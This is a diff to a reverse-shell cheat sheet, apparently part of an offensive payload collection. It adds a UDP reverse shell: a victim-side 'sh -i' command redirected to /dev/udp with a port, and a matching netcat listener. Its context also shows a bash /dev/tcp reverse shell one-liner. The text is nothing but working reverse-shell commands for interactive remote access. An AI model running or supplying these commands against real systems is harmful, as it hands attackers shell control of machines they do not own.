@@ -1,5 +1,17 @@
 # One-liner Reverse Shell
 
+## UDP Reverse shells
+
+#### Bash UDP
+
+```text
+Victim:
+sh -i >& /dev/udp/127.0.0.1/4242 0>&1
+
+Listener:
+nc -u -lvp 4242
+```
+
 ## Bash/Linux
 
 * shell script : `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
